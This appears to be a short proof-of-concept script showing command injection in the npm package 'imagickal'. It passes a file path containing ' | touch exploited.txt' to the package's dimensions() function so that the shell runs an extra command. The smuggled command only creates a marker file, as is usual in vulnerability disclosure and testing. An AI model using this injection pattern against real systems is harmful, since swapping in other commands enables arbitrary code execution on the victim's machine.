const pkg = require('imagickal');

const payload = " | touch exploited.txt";

console.log(pkg);

const path = payload;

const cb = function(error, data) {

};

pkg.dimensions(path, cb);